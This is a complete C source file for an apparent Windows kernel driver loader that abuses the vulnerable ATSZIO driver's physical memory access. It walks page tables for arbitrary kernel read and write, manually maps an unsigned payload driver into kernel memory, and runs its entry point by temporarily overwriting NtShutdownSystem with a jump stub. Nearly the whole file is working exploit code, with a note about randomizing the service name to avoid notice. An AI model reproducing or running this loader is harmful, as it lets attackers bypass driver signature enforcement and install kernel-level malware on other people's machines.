#include <stdio.h>
#include "Atszio.h"
#include "Macro.h"
#include "Win.h"

#pragma comment(lib, "ntdll.lib")

#define REG_DRV_SERVICE_NAME L"ldrdrv"
#define REG_SERVICES_NT_PATH (L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" REG_DRV_SERVICE_NAME)
#define REG_SERVICES_PATH (L"SYSTEM\\CurrentControlSet\\Services\\" REG_DRV_SERVICE_NAME)

typedef struct _LDR_CONTEXT
{
	HANDLE Device;
	ULONG64 DirectoryTableBase;
	ULONG64 PsLoadedModuleList;
	ULONG64 PsActiveProcessHead;
} LDR_CONTEXT, *PLDR_CONTEXT;

typedef enum _ARGV_INDICES
{
	ARGV_EXE_PATH,
	ARGV_ATSZIO_PATH,
	ARGV_PAYLOAD_PATH,
	ARGV_COUNT
} ARGV_INDICES;

BOOL
LdrEnablePrivilege(LPCSTR PrivilegeName)
{
	TOKEN_PRIVILEGES Tp;
	HANDLE TokenHandle;
	LUID Luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &TokenHandle))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, PrivilegeName, &Luid))
		return FALSE;

	Tp.PrivilegeCount = 1;
	Tp.Privileges->Luid = Luid;
	Tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(TokenHandle, FALSE, &Tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
		return FALSE;

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		return FALSE;

	return TRUE;
}

ULONG64
LdrGetDirectoryTableBase(PLDR_CONTEXT Context)
{
	SYSDBG_TRIAGE_DUMP TriageDmp = {};
	ULONG64 Result = 0;
	ULONG ReturnLength = 0;
	PVOID Buffer = NULL;
	HANDLE ThreadHandle;
	NTSTATUS Status;

	Buffer = VirtualAlloc(NULL, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (Buffer != NULL) {
		ThreadHandle = OpenThread(THREAD_ALL_ACCESS, false, GetCurrentThreadId());
		if (ThreadHandle != INVALID_HANDLE_VALUE) {
			TriageDmp.ThreadHandles = 1;
			TriageDmp.Handles = &ThreadHandle;
			Status = ZwSystemDebugControl(SysDbgGetTriageDump, &TriageDmp, sizeof(TriageDmp), Buffer, 0x100000, &ReturnLength);
			if (NT_SUCCESS(Status)) {
				DUMP_HEADER64 *DumpHdr = (DUMP_HEADER64 *)Buffer;

#ifdef DEBUG
				printf("Dumping DbgDumpHeader:\n");
				printf("\tSignature=%llX\n", (UINT64)DumpHdr->Signature);
				printf("\tValidDump=%llX\n", (UINT64)DumpHdr->ValidDump);
				printf("\tNtMajorVersion=%lli\n", (UINT64)DumpHdr->NtMajorVersion);
				printf("\tNtMinorVersion=%lli\n", (UINT64)DumpHdr->NtMinorVersion);
				printf("\tDirectoryTableBase=%llX\n", (UINT64)DumpHdr->DirectoryTableBase);
				printf("\tMmPfnDatabase=%llX\n", (UINT64)DumpHdr->MmPfnDatabase);
				printf("\tPsLoadedModuleList=%llX\n", (UINT64)DumpHdr->PsLoadedModuleList);
				printf("\tPsActiveProcessHead=%llX\n", (UINT64)DumpHdr->PsActiveProcessHead);
				printf("\tMachine=%llX\n", (UINT64)DumpHdr->Machine);
				printf("\tActiveProcessorCount=%llX\n", (UINT64)DumpHdr->ActiveProcessorCount);
#endif

				Context->PsLoadedModuleList = DumpHdr->PsLoadedModuleList;
				Context->PsActiveProcessHead = DumpHdr->PsActiveProcessHead;

				Result = DumpHdr->DirectoryTableBase;
			} else {
				printf("ZwSystemDebugControl failed with %lX\n", Status);
			}

			CloseHandle(ThreadHandle);
		} else {
			printf("Failed to open handle to current thread?\n");
		}

		VirtualFree(Buffer, 0x100000, MEM_FREE);
	}

	return Result;
}

// Translates a kernel-mode virtual address to physical address
UINT64
LdrTranslateVirtToPhys(PLDR_CONTEXT Context, UINT64 VirtAddr)
{
	MM_LA48 LinearAddr;
	MM_PTE Pte;

	if (Context->DirectoryTableBase == 0)
		Context->DirectoryTableBase = LdrGetDirectoryTableBase(Context);

	LinearAddr.Value = VirtAddr;
	// Read PML4E using current processes ActiveDirectoryBase from DbgDump
	if (!AtszioReadPhysAddr(Context->Device, Context->DirectoryTableBase + LinearAddr.Pml4Index * sizeof(Pte), &Pte, sizeof(Pte)))
		return 0;

	if (!Pte.Present)
		return 0;

	// Read PDPTE, need to check if this is a super-page or not
	if (!AtszioReadPhysAddr(Context->Device, PAGE_ADDRESS(Pte.PageFrameNumber) + LinearAddr.PdptIndex * sizeof(Pte), &Pte, sizeof(Pte)))
		return 0;

	if (!Pte.Present)
		return 0;

	// Super PDPTE (1GB), return the PFN from this PDPTE + super page offset from the virtual address
	if (Pte.LargePage)
		return PAGE_ADDRESS(Pte.PageFrameNumber) + SUPER_PAGE_OFFSET(VirtAddr);

	// Read PDE, need to check if this is a large-page or not
	if (!AtszioReadPhysAddr(Context->Device, PAGE_ADDRESS(Pte.PageFrameNumber) + LinearAddr.PdIndex * sizeof(Pte), &Pte, sizeof(Pte)))
		return 0;

	if (!Pte.Present)
		return 0;

	// Large PDE (2MB), return the PFN from this PDE + large page offset from the virtual address
	if (Pte.LargePage)
		return PAGE_ADDRESS(Pte.PageFrameNumber) + LARGE_PAGE_OFFSET(VirtAddr);

	// Read PTE and return the physical address
	if (!AtszioReadPhysAddr(Context->Device, PAGE_ADDRESS(Pte.PageFrameNumber) + LinearAddr.PtIndex * sizeof(Pte), &Pte, sizeof(Pte)))
		return 0;

	if (!Pte.Present)
		return 0;

	return PAGE_ADDRESS(Pte.PageFrameNumber) + PAGE_OFFSET(VirtAddr);
}

// Read an arbitrary kernel virtual address
BOOLEAN
LdrReadVirtAddr(PLDR_CONTEXT Context, UINT64 VirtAddr, PVOID Dst, UINT32 Size)
{
	UINT32 MaxReadable = 0;
	UINT32 SizeRead = 0;
	UINT64 PhysAddr = 0;

	while (Size > SizeRead) {
		PhysAddr = LdrTranslateVirtToPhys(Context, VirtAddr + SizeRead);
		if (PhysAddr == 0)
			return FALSE;

		MaxReadable = min(PAGE_SIZE - PAGE_OFFSET(PhysAddr), Size - SizeRead);
		// Read as much from the current physical address until we hit a page boundary or run out of space in the destination buffer
		if (!AtszioReadPhysAddr(Context->Device, PhysAddr, RVA_PTR(Dst, SizeRead), MaxReadable))
			return FALSE;

		SizeRead += MaxReadable;
	}

	return TRUE;
}

// Write to an arbitrary kernel virtual address
BOOLEAN
LdrWriteVirtAddr(PLDR_CONTEXT Context, UINT64 VirtAddr, PVOID Src, UINT32 Size)
{
	UINT32 MaxWriteable = 0;
	UINT32 SizeWritten = 0;
	UINT64 PhysAddr = 0;

	while (Size > SizeWritten) {
		PhysAddr = LdrTranslateVirtToPhys(Context, VirtAddr + SizeWritten);
		if (PhysAddr == 0)
			return FALSE;

		MaxWriteable = min(PAGE_SIZE - PAGE_OFFSET(PhysAddr), Size - SizeWritten);
		// Write as much from the current physical address until we hit a page boundary or run out of data in the source buffer
		if (!AtszioWritePhysAddr(Context->Device, PhysAddr, RVA_PTR(Src, SizeWritten), MaxWriteable))
			return FALSE;

		SizeWritten += MaxWriteable;
	}

	return TRUE;
}

ULONG64
LdrGetDriverBase(PLDR_CONTEXT Context, LPCWSTR DriverName, PUINT32 ImageSize)
{
	LIST_ENTRY64 Links;
	KLDR_DATA_TABLE_ENTRY Entry;
	UINT64 ListEntry;
	WCHAR BaseDriverName[MAX_PATH] = {};

	if (!LdrReadVirtAddr(Context, Context->PsLoadedModuleList, &Links, sizeof(Links)))
		return 0;

	ListEntry = Links.Flink;
	while (ListEntry != Context->PsLoadedModuleList) {
		// Read the entire data table entry
		if (!LdrReadVirtAddr(Context, ListEntry, &Entry, sizeof(Entry)))
			return 0;

		// Read the driver name
		if (!LdrReadVirtAddr(Context, (UINT64)Entry.BaseDllName.Buffer, BaseDriverName, Entry.BaseDllName.Length * sizeof(WCHAR)))
			return 0;

		if (wcscmp(DriverName, BaseDriverName) == 0) {
			if (ImageSize != nullptr)
				*ImageSize = Entry.SizeOfImage;

			return (UINT64)Entry.DllBase;
		}

		// Set the list entry to the next one
		ListEntry = Entry.InLoadOrderLinks.Flink;
	}

	return 0;
}

UINT64
LdrGetExportAddress(PLDR_CONTEXT Context, UINT64 ImageBase, LPCSTR ExportName)
{
	IMAGE_DOS_HEADER DosHeader;
	IMAGE_NT_HEADERS NtHeaders;
	IMAGE_EXPORT_DIRECTORY ExportDir;
	UINT64 AddressOfNames;
	UINT64 AddressOfFuncs;
	UINT64 AddressOfOrdinals;
	ULONG NameAddress;
	CHAR NameBuffer[256] = {};
	USHORT Ordinal;
	ULONG FuncAddress;

	LdrReadVirtAddr(Context, ImageBase, &DosHeader, sizeof(DosHeader));
	LdrReadVirtAddr(Context, ImageBase + DosHeader.e_lfanew, &NtHeaders, sizeof(NtHeaders));
	LdrReadVirtAddr(
		Context, ImageBase + NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, &ExportDir,
		sizeof(ExportDir));

	AddressOfNames = ImageBase + ExportDir.AddressOfNames;
	AddressOfFuncs = ImageBase + ExportDir.AddressOfFunctions;
	AddressOfOrdinals = ImageBase + ExportDir.AddressOfNameOrdinals;

	for (int i = 0; i < ExportDir.NumberOfNames; i++) {
		// Read the name address first
		if (!LdrReadVirtAddr(Context, AddressOfNames + i * sizeof(ULONG), &NameAddress, sizeof(NameAddress)))
			continue;

		// Now we read the actual name
		if (!LdrReadVirtAddr(Context, ImageBase + NameAddress, NameBuffer, sizeof(NameBuffer)))
			continue;

		if (strcmp(ExportName, NameBuffer) != 0)
			continue;

		// Read the name ordinal, this is the index into the function address array
		if (!LdrReadVirtAddr(Context, AddressOfOrdinals + i * sizeof(USHORT), &Ordinal, sizeof(Ordinal)))
			continue;

		// Read the function offset
		if (!LdrReadVirtAddr(Context, AddressOfFuncs + Ordinal * sizeof(ULONG), &FuncAddress, sizeof(FuncAddress)))
			continue;

		return ImageBase + FuncAddress;
	}

	return 0;
}

ULONG
LdrConvertRVAToFileOffset(PVOID ImageBase, ULONG RVA)
{
	PIMAGE_DOS_HEADER DosHeader;
	PIMAGE_NT_HEADERS NtHeader;
	PIMAGE_SECTION_HEADER SectionHeaders;

	DosHeader = RVA_PTR_T(IMAGE_DOS_HEADER, ImageBase, 0);
	NtHeader = RVA_PTR_T(IMAGE_NT_HEADERS, ImageBase, DosHeader->e_lfanew);
	SectionHeaders = IMAGE_FIRST_SECTION(NtHeader);

	if (RVA < SectionHeaders[0].VirtualAddress)
		return RVA;

	for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
		if (RVA >= SectionHeaders[i].VirtualAddress && RVA < SectionHeaders[i].VirtualAddress + SectionHeaders[i].Misc.VirtualSize)
			return RVA - SectionHeaders[i].VirtualAddress + SectionHeaders[i].PointerToRawData;

	return 0;
}

BOOLEAN
LdrLoadDriver(PLDR_CONTEXT Context, LPCSTR FilePath)
{
	HANDLE PayloadFile;
	HANDLE PayloadMapping;
	PVOID MappedPayload;
	UINT64 KernelBuffer;
	PIMAGE_DOS_HEADER DosHeader;
	PIMAGE_NT_HEADERS NtHeader;
	PIMAGE_SECTION_HEADER SectionHeaders;
	PIMAGE_SECTION_HEADER SectionHeader;
	PIMAGE_DATA_DIRECTORY RelocDir;
	PIMAGE_DATA_DIRECTORY ImportDir;
	PIMAGE_BASE_RELOCATION BaseRelocs;
	IMAGE_RELOCATION_ENTRY Reloc;
	PIMAGE_IMPORT_DESCRIPTOR ImportDesc;
	PIMAGE_THUNK_DATA ImportThunk;
	PIMAGE_IMPORT_BY_NAME ImportByName;
	LPCSTR ImportModuleName;
	WCHAR ImportModuleWideName[256];
	UINT64 ImportModuleBase;
	UINT64 ImportAddress;
	UINT64 FunctionAddress;
	UINT64 RelocVA;
	UINT64 RelocValue;
	BOOLEAN Result = TRUE;

	PayloadFile = CreateFile(FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (PayloadFile != INVALID_HANDLE_VALUE) {
		PayloadMapping = CreateFileMapping(PayloadFile, NULL, PAGE_READONLY, 0, 0, NULL);
		if (PayloadMapping != INVALID_HANDLE_VALUE) {
			MappedPayload = MapViewOfFile(PayloadMapping, FILE_MAP_READ, 0, 0, 0);
			if (MappedPayload != NULL) {
				DosHeader = RVA_PTR_T(IMAGE_DOS_HEADER, MappedPayload, 0);
				NtHeader = RVA_PTR_T(IMAGE_NT_HEADERS, MappedPayload, DosHeader->e_lfanew);
				SectionHeaders = IMAGE_FIRST_SECTION(NtHeader);
				KernelBuffer = AtszioAllocateContigMemory(Context, NtHeader->OptionalHeader.SizeOfImage);
				if (KernelBuffer != 0) {
					printf("KernelBuffer: %llX\n", KernelBuffer);
					for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
						SectionHeader = &SectionHeaders[i];
						LdrWriteVirtAddr(
							Context, RVA(KernelBuffer, SectionHeader->VirtualAddress),
							RVA_PTR(MappedPayload, SectionHeader->PointerToRawData),
							SectionHeader->SizeOfRawData);
					}

					RelocDir = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
					ImportDir = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

					if (RelocDir->Size != 0) {
						BaseRelocs = RVA_PTR_T(
							IMAGE_BASE_RELOCATION, MappedPayload,
							LdrConvertRVAToFileOffset(MappedPayload, RelocDir->VirtualAddress));
						while (BaseRelocs->SizeOfBlock > 0) {
							RelocVA = KernelBuffer + RelocDir->VirtualAddress;
							// Each relocation block contains a variable number of WORDs after the initial IMAGE_BASE_RELOCATION structure
							for (int i = 0; i < (BaseRelocs->SizeOfBlock - 8) / sizeof(WORD); i++) {
								Reloc = *RVA_PTR_T(IMAGE_RELOCATION_ENTRY, BaseRelocs, 8 + i * sizeof(WORD));
								switch (Reloc.Type) {
								case IMAGE_REL_BASED_DIR64:
									LdrReadVirtAddr(
										Context, RVA(RelocVA, Reloc.Offset), &RelocValue,
										sizeof(RelocValue));
									RelocValue += KernelBuffer - NtHeader->OptionalHeader.ImageBase;
									LdrWriteVirtAddr(
										Context, RVA(RelocVA, Reloc.Offset), &RelocValue,
										sizeof(RelocValue));
									break;
								default:
									break;
								}
							}

							BaseRelocs = RVA_PTR_T(IMAGE_BASE_RELOCATION, BaseRelocs, BaseRelocs->SizeOfBlock);
						}
					}

					if (ImportDir->VirtualAddress != 0 && ImportDir->Size != 0) {
						ImportDesc = RVA_PTR_T(
							IMAGE_IMPORT_DESCRIPTOR, MappedPayload,
							LdrConvertRVAToFileOffset(MappedPayload, ImportDir->VirtualAddress));
						while (ImportDesc->Name) {
							ImportModuleName = (LPCSTR)
								RVA_PTR(MappedPayload,
									LdrConvertRVAToFileOffset(MappedPayload, ImportDesc->Name));
							// Convert name to unicode/wide string, we need to do this to look up the name
							mbstowcs(ImportModuleWideName, ImportModuleName, 256);

							ImportModuleBase = LdrGetDriverBase(Context, ImportModuleWideName, NULL);

							ImportThunk = RVA_PTR_T(
								IMAGE_THUNK_DATA, MappedPayload,
								LdrConvertRVAToFileOffset(MappedPayload, ImportDesc->OriginalFirstThunk));
							ImportAddress = KernelBuffer + ImportDesc->FirstThunk;
							while (ImportThunk->u1.AddressOfData) {
								ImportByName = RVA_PTR_T(
									IMAGE_IMPORT_BY_NAME, MappedPayload,
									LdrConvertRVAToFileOffset(
										MappedPayload, ImportThunk->u1.AddressOfData));

								FunctionAddress =
									LdrGetExportAddress(Context, ImportModuleBase, ImportByName->Name);
								LdrWriteVirtAddr(
									Context, ImportAddress, &FunctionAddress, sizeof(FunctionAddress));

								ImportThunk++;
								ImportAddress += 8;
							}

							ImportDesc++;
						}
					}
				}

				UINT64 NtosBase = LdrGetDriverBase(Context, L"ntoskrnl.exe", NULL);
				// Get the address of NtShutdownSystem, we will use this to call our DriverEntry
				UINT64 FnAddr = LdrGetExportAddress(Context, NtosBase, "NtShutdownSystem");

				UCHAR CodeBuffer[64] = {};
				// Read the existing bytes to preserve it
				LdrReadVirtAddr(Context, FnAddr, CodeBuffer, sizeof(CodeBuffer));

				// MOV RAX, <DriverEntry>; JMP RAX
				UCHAR Shellcode[64] = { 0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x11, 0x11, 0x11, 0x11, 0xFF, 0xE0 };

				// Write the address of the loaded driver's entry point
				*RVA_PTR_T(ULONG_PTR, Shellcode, 2) = RVA(KernelBuffer, NtHeader->OptionalHeader.AddressOfEntryPoint);

				LdrWriteVirtAddr(Context, FnAddr, Shellcode, sizeof(Shellcode));

				// Call ZwShutdownSystem, it's return value is the returned value from our DriverEntry
				printf("Hooked ZwShutdownSystem: %lX", ZwShutdownSystem(ShutdownPowerOff));

				// Restore the previous contents of NtShutdownSystem
				LdrWriteVirtAddr(Context, FnAddr, CodeBuffer, sizeof(CodeBuffer));

				UnmapViewOfFile(MappedPayload);
			} else {
				printf("Failed to map view of file\n");
				Result = FALSE;
			}

			CloseHandle(PayloadMapping);
		} else {
			printf("Failed to create file mapping\n");
			Result = FALSE;
		}

		CloseHandle(PayloadFile);
	} else {
		printf("Failed to open '%s'\n", FilePath);
		Result = FALSE;
	}

	return Result;
}

int
main(int argc, char **argv)
{
	NTSTATUS Status;
	HKEY DriverSvcKey;
	LDR_CONTEXT Context = {};
	UNICODE_STRING DriverRegistryPath;
	ANSI_STRING DriverFilePath;
	CHAR CurrDirectory[MAX_PATH] = { 0 };
	CHAR DriverPathBuf[MAX_PATH] = { 0 };
	CHAR PayloadPathBuf[MAX_PATH] = { 0 };
	CHAR DriverNtPathBuf[MAX_PATH] = { 0 };
	DWORD DriverSvcType = SERVICE_KERNEL_DRIVER;
	DWORD Disposition;
	HANDLE PayloadFile;
	HANDLE PayloadMapping;
	PVOID MappedPayload;
	LSTATUS Err;

	if (argc < ARGV_COUNT) {
		printf("Usage:\n\t\tpassenger.exe <path to atszio.sys> <path to payload .sys>");
		return EXIT_FAILURE;
	}

	if (!LdrEnablePrivilege(SE_LOAD_DRIVER_NAME) || !LdrEnablePrivilege(SE_DEBUG_NAME)) {
		printf("Failed to enable privileges\n");
		return EXIT_FAILURE;
	}

	RtlInitUnicodeString(&DriverRegistryPath, REG_SERVICES_NT_PATH);

#ifndef VMWARE_TEST
	GetCurrentDirectory(MAX_PATH, CurrDirectory);
	strcat_s(DriverPathBuf, MAX_PATH, "\\??\\");
	strcat_s(DriverPathBuf, MAX_PATH, CurrDirectory);
	strcat_s(DriverPathBuf, MAX_PATH, "\\");
	strcat_s(DriverPathBuf, MAX_PATH, argv[ARGV_ATSZIO_PATH]);

	strcat_s(PayloadPathBuf, MAX_PATH, "\\??\\");
	strcat_s(PayloadPathBuf, MAX_PATH, CurrDirectory);
	strcat_s(PayloadPathBuf, MAX_PATH, "\\");
	strcat_s(PayloadPathBuf, MAX_PATH, argv[ARGV_PAYLOAD_PATH]);
#else
	strcat_s(DriverPathBuf, MAX_PATH, "\\??\\UNC\\vmware-host\\Shared Folders\\passenger\\");
	strcat_s(DriverPathBuf, MAX_PATH, argv[ARGV_ATSZIO_PATH]);
	strcat_s(PayloadPathBuf, MAX_PATH, "\\??\\UNC\\vmware-host\\Shared Folders\\passenger\\");
	strcat_s(PayloadPathBuf, MAX_PATH, argv[ARGV_PAYLOAD_PATH]);
#endif

	RtlInitAnsiString(&DriverFilePath, DriverPathBuf);

	// TODO: Randomize service name
	Err = RegCreateKeyExW(
		HKEY_LOCAL_MACHINE, REG_SERVICES_PATH, 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &DriverSvcKey, &Disposition);
	if (Err == ERROR_SUCCESS) {
		Err |= RegSetValueEx(DriverSvcKey, "Type", 0, REG_DWORD, (PBYTE)&DriverSvcType, sizeof(DWORD));
		Err |= RegSetValueEx(DriverSvcKey, "ImagePath", 0, REG_SZ, (PBYTE)DriverFilePath.Buffer, DriverFilePath.Length);
		if (Err == ERROR_SUCCESS) {
			RegCloseKey(DriverSvcKey);
			Status = NtLoadDriver(&DriverRegistryPath);
			if (!NT_SUCCESS(Status)) {
				printf("Failed to load the driver: Path=%wZ %lX\n", DriverRegistryPath, Status);
				return EXIT_FAILURE;
			}
		} else {
			printf("Failed to write driver subkeys: %lX\n", Err);
		}
	} else {
		printf("Failed to create driver service registry key: %lX\n", Err);
	}

	Context.Device =
		CreateFile("\\\\.\\ATSZIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (Context.Device != INVALID_HANDLE_VALUE) {
		// Initialize directory table base, this will fill out some other important addresses in `Context`
		Context.DirectoryTableBase = LdrGetDirectoryTableBase(&Context);

		LdrLoadDriver(&Context, PayloadPathBuf);

		// Close the handle to the driver
		CloseHandle(Context.Device);
	} else {
		printf("Failed to open handle to device\n");
	}

	Status = NtUnloadDriver(&DriverRegistryPath);
	if (!NT_SUCCESS(Status)) {
		printf("Failed to unload the driver: %lX\n", Status);
		return EXIT_FAILURE;
	}

	// TODO: Delete registry keys

	printf("Exiting...\n");

	return Err;
}
